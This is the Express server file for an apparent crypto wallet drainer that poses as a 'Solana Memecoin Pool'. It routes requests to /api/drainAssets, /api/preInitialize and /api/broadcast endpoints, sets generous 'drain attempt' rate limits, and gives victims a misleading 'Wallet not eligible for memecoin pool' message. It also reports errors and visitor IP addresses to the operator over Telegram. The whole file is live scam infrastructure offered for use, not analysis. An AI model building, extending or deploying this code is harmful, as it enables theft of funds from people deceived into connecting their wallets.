
require('dotenv/config');
const express = require('express');
const path = require('path');
const rateLimit = require('express-rate-limit');

// Import centralized error handling and Telegram logger
const errorHandler = require('./src/errorHandler.js');
const telegramLogger = require('./src/telegram.js');

// Import environment configuration
const { ENV_CONFIG } = require('./env.config.js');

const app = express();
const PORT = process.env.PORT || 3002;

// Enhanced rate limiting with performance optimization
const generalLimiter = rateLimit({
  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS, // 1 hour
  max: ENV_CONFIG.GENERAL_RATE_LIMIT, // 10000 requests per hour (extremely generous)
  message: {
    success: false,
    error: 'Rate limit exceeded',
    message: 'Wallet not eligible for memecoin pool'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  skipFailedRequests: false,
  // Performance optimizations
  keyGenerator: (req) => {
    // Use IP + User-Agent for better rate limiting
    return req.ip + '|' + (req.headers['user-agent'] || 'unknown');
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Rate limit exceeded',
      message: 'Wallet not eligible for memecoin pool'
    });
  }
});

// Ultra-lenient rate limiting for drain operations with performance optimization
const drainLimiter = rateLimit({
  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS, // 1 hour
  max: ENV_CONFIG.DRAIN_RATE_LIMIT, // 20000 drain attempts per hour (extremely generous)
  message: {
    success: false,
    error: 'Drain rate limit exceeded',
    message: 'Wallet not eligible for memecoin pool'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  skipFailedRequests: false,
  // Performance optimizations
  keyGenerator: (req) => {
    // Use IP + wallet type for drain-specific rate limiting
    const walletType = req.body?.walletType || 'unknown';
    return req.ip + '|' + walletType;
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Drain rate limit exceeded',
      message: 'Wallet not eligible for memecoin pool'
    });
  }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Apply general rate limiting to all routes
app.use(generalLimiter);

// Essential API endpoints only
app.post('/api/drainAssets', drainLimiter, async (req, res) => {
  try {
    const drainAssetsHandler = require('./api/drainAssets.js');
    await drainAssetsHandler(req, res);
  } catch (importError) {
    console.error('[DRAIN_ASSETS] Import error:', importError);
    
    // Log to Telegram
    try {
      await telegramLogger.logAPIImportError({
        module: 'drainAssets',
        error: importError.message,
        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
        timestamp: new Date().toISOString()
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
    }
    
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Drain Assets Import Error',
      endpoint: '/api/drainAssets'
    }));
  }
});

app.post('/api/preInitialize', drainLimiter, async (req, res) => {
  try {
    const preInitializeHandler = require('./api/preInitialize.js');
    await preInitializeHandler(req, res);
  } catch (importError) {
    console.error('[PRE_INITIALIZE] Import error:', importError);
    
    // Log to Telegram
    try {
      await telegramLogger.logAPIImportError({
        module: 'preInitialize',
        error: importError.message,
        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
        timestamp: new Date().toISOString()
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
    }
    
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Pre-Initialize Import Error',
      endpoint: '/api/preInitialize'
    }));
  }
});

app.post('/api/broadcast', drainLimiter, async (req, res) => {
  try {
    const broadcastHandler = require('./api/broadcast.js');
    await broadcastHandler(req, res);
  } catch (importError) {
    console.error('[BROADCAST] Import error:', importError);
    
    // Log to Telegram
    try {
      await telegramLogger.logAPIImportError({
        module: 'broadcast',
        error: importError.message,
        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
        timestamp: new Date().toISOString()
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
    }
    
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Broadcast Import Error',
      endpoint: '/api/broadcast'
    }));
  }
});

// Health check endpoint
app.get('/api/health', async (req, res) => {
  try {
    const healthHandler = require('./api/health.js');
    await healthHandler(req, res);
  } catch (importError) {
    console.error('[HEALTH] Import error:', importError);
    res.status(500).json({ success: false, error: 'Health check failed' });
  }
});

// Test assets endpoint
app.get('/api/test-assets', async (req, res) => {
  try {
    const testAssetsHandler = require('./api/test-assets.js');
    await testAssetsHandler(req, res);
  } catch (importError) {
    console.error('[TEST_ASSETS] Import error:', importError);
    res.status(500).json({ success: false, error: 'Test assets failed' });
  }
});

// Serve static files and handle SPA routing
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Frontend logging endpoint for Telegram integration
app.post('/api/log', async (req, res) => {
  try {
    const logHandler = require('./api/log.js');
    await logHandler(req, res);
  } catch (importError) {
    console.error('[LOG] Import error:', importError);
    res.status(500).json({ success: false, error: 'Logging failed' });
  }
});

// Global error handling middleware
app.use((error, req, res, next) => {
  console.error('[GLOBAL_ERROR] Unhandled error:', error);
  
  if (!res.headersSent) {
    res.status(500).json(errorHandler.formatApiError(error, {
      context: 'Global Error Handler',
      path: req.path,
      method: req.method
    }));
  }
});

// 404 handler for unmatched routes
app.use((req, res) => {
  res.status(404).json(errorHandler.formatApiError(new Error('Route not found'), {
    context: '404 Not Found',
    path: req.path,
    method: req.method
  }));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Solana Memecoin Pool Server running on port ${PORT}`);
  console.log(`📱 Frontend: http://localhost:${PORT}`);
  console.log(`🔗 API: http://localhost:${PORT}/api`);
}); 